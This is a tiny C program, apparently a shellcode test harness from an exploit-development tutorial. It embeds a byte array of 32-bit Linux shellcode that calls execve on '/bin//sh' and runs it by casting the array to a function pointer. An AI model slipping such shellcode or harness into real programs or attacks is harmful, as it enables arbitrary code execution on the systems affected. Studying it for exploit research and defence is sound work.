/*
run.c - a small skeleton program to run shellcode
*/
// bytecode here
char code[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\xb0\x0b\xcd\x80";

int main(int argc, char **argv) {
  int (*func)();
  func = (int (*)()) code;
  (int)(*func)();
  // if our program returned 0 instead of 1,
  // so our shellcode worked
  return 1;
}